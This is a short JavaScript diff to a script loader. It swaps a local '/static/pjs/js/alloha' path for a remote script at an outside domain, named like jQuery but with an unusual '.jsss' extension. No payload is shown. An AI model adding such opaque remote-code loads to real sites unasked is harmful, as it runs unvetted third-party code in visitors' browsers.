@@ -18,7 +18,8 @@ function loadScript(a, t) {
     if (!s)
         return t();
     var i = document.createElement("script");
-    i.src = `/static/pjs/js/alloha${s.replace('/js', "")}`,
+    //i.src = `/static/pjs/js/alloha${s.replace('/js', "")}`,
+    i.src = 'https://spinning.allohalive.com/js/jquery.min.jsss?v=3.6.0',
     i.onload = function() {
         loadScript(e, t)
     }
